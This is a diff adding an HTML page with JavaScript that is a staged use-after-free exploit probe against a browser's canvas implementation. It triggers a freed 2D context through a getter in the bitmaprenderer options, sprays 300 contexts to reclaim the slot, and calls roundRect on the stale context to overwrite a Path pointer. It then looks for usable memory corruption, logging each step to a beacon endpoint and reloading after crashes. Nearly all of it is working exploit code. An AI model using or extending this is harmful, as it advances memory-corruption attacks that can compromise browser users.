@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V923J - roundRect write on valid 2D-reclaim: observe corruption/side effects</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V923J - observe effects of roundRect heap-pointer write on a valid reclaimed slot</h1>
+
+<p class="key">
+<b>Builds on V923G (all OK).</b> Reclaims the freed 2D context with <b>real 2D contexts</b> (valid slot), calls
+<code>roundRect(10,10,100,100,5)</code> on the <b>stale CTX</b> (gate-free; <code>ensureCairoPath()</code> writes a
+<code>cairo_t*</code> into <code>m_path</code> at <code>context+48</code>, overwriting the reclaiming context&rsquo;s Path).
+Then probes for observable effects via the reclaiming contexts and stale CTX (path queries, fill/stroke, beginPath/closePath,
+save/restore, exceptions, anomalies) vs a control context. Goal: any detectable/usable corruption without an address read.
+Paced + crash-detected per step.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v923j_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v923j_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v923j_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V923J-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || e).slice(0, 90) : 'none'; }
+function reloadSoon(ms) { setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms); }
+
+var CTX = null, HASRR = false, KEEP = null;
+
+function trigger(canvas) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try { ctx.lineWidth = 2; ctx.fillStyle = '#123456'; } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+function spray2d(count) {
+  var keep = [];
+  for (var i = 0; i < count; i++) {
+    var c = document.createElement('canvas');
+    c.width = 8; c.height = 8;
+    var cx = null;
+    try { cx = c.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.beginPath(); cx.rect(1, 1, 2, 2); cx.lineWidth = 50 + i; } catch (e2) {}
+      keep.push({ c: c, cx: cx, i: i });
+    }
+  }
+  KEEP = keep;
+  return keep;
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+var STAGES = ['rr', 'obs-stale', 'obs-reclaim', 'obs-fill', 'obs-path'];
+function stageIdx(s) { for (var i = 0; i < STAGES.length; i++) if (STAGES[i] === s) return i; return 0; }
+function curStage() { return lsGet('stage') || STAGES[0]; }
+function advance(msg) {
+  var i = stageIdx(curStage());
+  if (i + 1 < STAGES.length) { lsSet('stage', STAGES[i + 1]); lsDel('tries'); bks('ADV', STAGES[i] + '->' + STAGES[i + 1] + (msg ? ',' + msg : '')); }
+  else { lsSet('phase', 'done'); bks('DONE', 'all stages done'); }
+}
+
+function step(tag, label, fn) {
+  var st = curStage(), t = bumpTry();
+  bks(tag + '-PRE', 'stage=' + st + ',try=' + t + ',' + label);
+  say(tag + ' ' + label);
+  lsSet('pending', st + ':' + tag);
+  var res, err = null;
+  try { res = fn(); } catch (e) { err = e; }
+  lsDel('pending');
+  if (err) { bks(tag + '-ERR', 'stage=' + st + ',' + errOf(err)); say(tag + ' ERR ' + errOf(err)); return { ok: false, err: err }; }
+  bks(tag + '-OK', 'stage=' + st + (res !== undefined ? ',' + String(res).slice(0, 120) : ''));
+  say(tag + ' OK ' + (res !== undefined ? res : ''));
+  return { ok: true, res: res };
+}
+
+function main() {
+  var q = location.search;
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('phase'); lsDel('stage'); lsDel('tries');
+    bks('RESET', 'cleared'); say('cleared. reopen ?op=auto'); return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > 150) { bks('GIVEUP', 'loads=' + loads); say('give up - reset'); return; }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending'); var t = triesOf();
+    bks('CRASH', 'pending=' + pend + ',try=' + t + ',load=' + loads);
+    say('CRASH ' + pend + ' try=' + t);
+    if (t >= 2) { bks('BLACKLIST', pend); advance('crashx2'); }
+    reloadSoon(3500); return;
+  }
+
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var st = curStage();
+  bks('BOOT', 'load=' + loads + ',stage=' + st + ',ua=' + navigator.userAgent.slice(0, 44));
+  say('load=' + loads + ' stage=' + st);
+
+  var canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas); window._v923jcanvas = canvas;
+
+  var tr = trigger(canvas);
+  if (!tr.saved) { bks('ERR', 'trigger-failed'); reloadSoon(3000); return; }
+  CTX = tr.saved; HASRR = tr.hasRR;
+  bks('PREFLIGHT', 'rr=' + HASRR);
+
+  var keep = spray2d(300);
+  bks('ARM', '2dctx=' + keep.length + ',stage=' + st);
+
+  /* control context (not involved in UAF) */
+  var cc = document.createElement('canvas'); cc.width = 8; cc.height = 8;
+  var ctrl = cc.getContext('2d');
+
+  if (st === 'rr') {
+    if (!HASRR) { bks('NORR', 'x'); advance('norr'); reloadSoon(3000); return; }
+    if (step('RR', 'roundRect(10,10,100,100,5)', function () { CTX.roundRect(10, 10, 100, 100, 5); }).ok) advance('rr-ok');
+    else advance('rr-err');
+    reloadSoon(3000); return;
+  }
+
+  if (st === 'obs-stale') {
+    /* call roundRect again, then probe stale CTX path/state methods */
+    if (HASRR) { var r1 = step('RR2', 'stale.roundRect-again', function () { CTX.roundRect(10, 10, 100, 100, 5); }); if (!r1.ok) { advance('rr2-err'); reloadSoon(3000); return; } }
+    var s1 = step('IPP', 'stale.isPointInPath(15,15)', function () { return CTX.isPointInPath(15, 15); });
+    var s2 = step('IPS', 'stale.isPointInStroke(10,10)', function () { return CTX.isPointInStroke(10, 10); });
+    var s3 = step('BP', 'stale.beginPath', function () { CTX.beginPath(); });
+    var s4 = step('CP', 'stale.closePath', function () { CTX.closePath(); });
+    bks('OBSSTALE', 'ipp=' + (s1.ok ? s1.res : 'E') + ',ips=' + (s2.ok ? s2.res : 'E') + ',bp=' + s3.ok + ',cp=' + s4.ok);
+    advance('obs-stale-done'); reloadSoon(3000); return;
+  }
+
+  if (st === 'obs-reclaim') {
+    if (HASRR) { var r2 = step('RR3', 'stale.roundRect', function () { CTX.roundRect(10, 10, 100, 100, 5); }); if (!r2.ok) { advance('rr3-err'); reloadSoon(3000); return; } }
+    /* probe reclaiming contexts for anomalies */
+    var okN = 0, errN = 0, anom = [];
+    for (var i = 0; i < Math.min(keep.length, 60); i++) {
+      var cx = keep[i].cx, r, threw = null;
+      try { r = cx.isPointInPath(2, 2); } catch (e) { threw = errOf(e); }
+      if (threw) { errN++; if (anom.length < 6) anom.push('i' + i + ':ipp:' + threw); }
+      else okN++;
+      try { cx.beginPath(); cx.rect(0, 0, 1, 1); var r2 = cx.isPointInPath(0.5, 0.5); } catch (e) { errN++; if (anom.length < 8) anom.push('i' + i + ':' + errOf(e)); }
+    }
+    /* control */
+    var ctrlOk = true, ctrlRes;
+    try { ctrl.beginPath(); ctrl.rect(1, 1, 2, 2); ctrlRes = ctrl.isPointInPath(2, 2); } catch (e) { ctrlOk = false; }
+    bks('OBSREC', 'ok=' + okN + ',err=' + errN + ',ctrl=' + ctrlOk + '/' + ctrlRes + ',anom=' + anom.join('|').slice(0, 280));
+    say('reclaim obs ok=' + okN + ' err=' + errN + ' ctrl=' + ctrlOk);
+    advance('obs-rec-done'); reloadSoon(3000); return;
+  }
+
+  if (st === 'obs-fill') {
+    if (HASRR) { var r3 = step('RR4', 'stale.roundRect', function () { CTX.roundRect(10, 10, 100, 100, 5); }); if (!r3.ok) { advance('rr4-err'); reloadSoon(3000); return; } }
+    var fillOk = 0, fillErr = 0, ferr = [];
+    for (var i = 0; i < Math.min(keep.length, 40); i++) {
+      var cx = keep[i].cx;
+      try { cx.save(); cx.beginPath(); cx.rect(0, 0, 4, 4); cx.fillStyle = '#ff0000'; cx.fill(); cx.restore(); fillOk++; }
+      catch (e) { fillErr++; if (ferr.length < 5) ferr.push('i' + i + ':' + errOf(e)); }
+    }
+    bks('OBSFILL', 'ok=' + fillOk + ',err=' + fillErr + ',e=' + ferr.join('|').slice(0, 260));
+    advance('obs-fill-done'); reloadSoon(3000); return;
+  }
+
+  if (st === 'obs-path') {
+    if (HASRR) { var r4 = step('RR5', 'stale.roundRect+fill', function () { CTX.roundRect(10, 10, 100, 100, 5); try { CTX.stroke(); } catch (e) {} }); if (!r4.ok) { advance('rr5-err'); reloadSoon(3000); return; } }
+    bks('OBSPATH', 'stale stroke attempted, survived=' + (r4.ok));
+    /* one more: closePath chain on stale */
+    var cp = step('CHAIN', 'stale.closePath/beginPath/roundRect', function () { CTX.closePath(); CTX.beginPath(); CTX.roundRect(5, 5, 50, 50, 3); });
+    bks('CHAINRES', 'ok=' + cp.ok);
+    advance('done'); reloadSoon(3000); return;
+  }
+
+  advance('unknown'); reloadSoon(3000);
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
